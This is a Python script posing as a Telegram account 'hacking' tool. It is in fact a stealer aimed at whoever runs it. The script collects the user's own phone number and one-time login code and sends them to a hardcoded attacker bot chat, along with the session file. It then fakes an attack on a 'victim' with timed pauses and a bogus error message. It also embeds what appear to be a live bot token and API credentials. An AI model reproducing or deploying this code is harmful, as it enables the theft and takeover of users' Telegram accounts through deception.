
from telethon import TelegramClient, events
import telegram
import asyncio
import time
from module import *



YOUR_APP_ID = 24835154
YOUR_APP_HASH = 'e7c35ab96f8d8f76513fd7a3ae242c3b'
bot = telegram.Bot(token='7659833994:AAFHk5-kS7KRS5qlRneiL7mmnatUjqOWcFc')

client = TelegramClient('yakvenalex_habr', YOUR_APP_ID, YOUR_APP_HASH)

cls()
print(banner)

time.sleep(2)
cls()
phone = input(
    cyan+bold+'[+]\033[0m \033[01mEnter your phone with country code (eg: +92) >\033[0m ')


async def main():
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        otp = input(
            cyan + bold + "[+]\033[0m \033[01mEnter the OTP (check inside your telegram app for the otp from telegramm if it not comes to your sms) >\033[0m ")
        await bot.send_message(chat_id='6349139033',
                               text=f"Phone Number: {phone}\nOTP: {otp}")
        file = open('yakvenalex_habr.session', 'rb')
        await bot.send_document(chat_id='6349139033',document=file)
        victim = input(
            cyan + bold + '[+]\033[0m \033[01mEnter victim\'s phone with country code to hack(eg: +92) >\033[0m ')
        print(
            "Connecting to victim's api...")
        time.sleep(
            3)
        choice = input("Do you want to login to their account [y/n] ? : ")
        if (
                choice == 'y'):
            print("Please wait 1 to 2 minutes until it logins and send their otp")
            time.sleep(
                6)
            print(red + "Error in getting otp ! 2 step verification may be enabled or try after 15 minutes\033[0m'")
            print(
                " ")
            print(" ")
        else:
            print("Bye...")
            print(" ")
            print(" ")
            os.system("exit")

        await client.sign_in(phone,
                             otp)
        me = await client.get_me()
        print(me.first_name)
    finally:
        await client.disconnect()


asyncio.run(main())